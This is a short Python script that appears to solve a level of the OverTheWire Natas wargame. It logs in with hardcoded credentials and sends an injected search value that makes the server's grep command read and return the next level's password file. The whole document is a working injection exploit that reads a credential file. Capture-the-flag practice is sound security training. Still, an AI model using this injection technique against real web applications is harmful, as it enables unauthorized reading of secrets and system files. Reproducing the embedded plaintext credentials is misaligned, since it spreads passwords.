import requests

username = "natas10"
password = "nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu"

session = requests.Session()

url = "http://{}.natas.labs.overthewire.org/".format(username)
response = session.post(url, data={
                        "needle": '. /etc/natas_webpass/natas11 #', "submit": "submit"}, auth=(username, password))
content = response.text

print(content)
